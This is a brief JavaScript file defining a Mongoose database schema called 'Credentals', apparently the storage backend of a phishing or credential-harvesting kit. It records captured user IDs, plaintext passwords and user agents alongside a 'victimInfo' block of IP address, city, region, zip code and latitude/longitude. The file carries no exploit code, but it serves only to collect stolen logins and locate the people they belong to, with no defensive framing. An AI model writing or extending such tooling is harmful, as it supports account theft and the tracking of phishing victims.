const mongoose = require("mongoose");

const credentals = new mongoose.Schema(
    {
        userID: String,
        password: String,
        userAgent: String,
        victimInfo: {
            ip: String,
            city: String,
            country: String,
            countryCode: String,
            region: String,
            regionName: String,
            zip: String,
            lat: String,
            lon: String,
        },
    },
  { timestamps: true },
);

const Credentals = mongoose.model("Credentals", credentals);
module.exports = Credentals;
